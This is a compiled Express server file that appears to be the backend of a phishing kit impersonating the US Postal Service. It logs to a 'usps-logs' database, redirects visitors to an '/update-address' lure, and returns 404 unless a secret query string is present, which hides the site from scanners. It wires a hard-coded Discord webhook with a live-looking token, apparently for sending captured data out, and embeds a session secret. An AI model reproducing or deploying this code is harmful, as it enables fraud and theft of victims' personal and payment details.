"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    Object.defineProperty(o, k2, { enumerable: true, get: function() { return m[k]; } });
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.Socket = exports.Webhook = void 0;
const dotenv_1 = __importDefault(require("dotenv"));
const express_1 = __importDefault(require("express"));
const express_session_1 = __importDefault(require("express-session"));
const mongoose_1 = __importDefault(require("mongoose"));
const request_ip_1 = __importDefault(require("request-ip"));
const http_1 = require("http");
const socket_io_1 = require("socket.io");
const discord_js_1 = require("discord.js");
const app = express_1.default();
const httpServer = http_1.createServer(app);
exports.Webhook = new discord_js_1.WebhookClient('850354121760702514', 'yyZniZZuKs30L28KUtFqm83jFdfaxYe1P4BnOjwfjuivgdjtgD_i8e5qW88SYtL4YHZL');
exports.Socket = new socket_io_1.Server(httpServer, {
// ...
});
dotenv_1.default.config();
mongoose_1.default.Promise = global.Promise;
mongoose_1.default.connect('mongodb://localhost/usps-logs', {
    useNewUrlParser: true,
    useUnifiedTopology: true
})
    .then(() => {
    console.log('Database connection established');
})
    .catch((err) => {
    console.log('Unable to connect to the database');
});
app.use(request_ip_1.default.mw());
app.use(express_1.default.urlencoded({ extended: false }));
app.use(express_1.default.json());
app.use(express_session_1.default({
    name: 'usps.secure',
    proxy: true,
    cookie: {
        secure: process.env.environment === 'production'
            ? true
            : false
    },
    saveUninitialized: true,
    resave: false,
    secret: 'secret213jasdjasjdj12391923912kokots33ko9'
}));
app.set('views', __dirname + '/views');
app.set('view engine', 'html');
app.set('trust proxy', true);
app.set('json spaces', 2);
const api_1 = __importDefault(require("./routes/api"));
const index_1 = __importDefault(require("./routes/index"));
app.use('/', express_1.default.static(__dirname + '/views'));
app.use('/api', api_1.default);
app.use('/', (req, res, next) => {
    if (!req.url.includes('?connection=secure'))
        return res.status(404).end();
    res.cookie('usps.id', req.session.id);
    res.setHeader('session-id', req.session.id);
    return next();
}, index_1.default);
app.get('*', (req, res) => {
    res.redirect('/update-address');
});
const SocketInitializer = __importStar(require("./modules/socket"));
SocketInitializer.launch();
httpServer.listen(4847, () => {
    console.log('App is listening on port:', 4847);
});
//# sourceMappingURL=app.js.map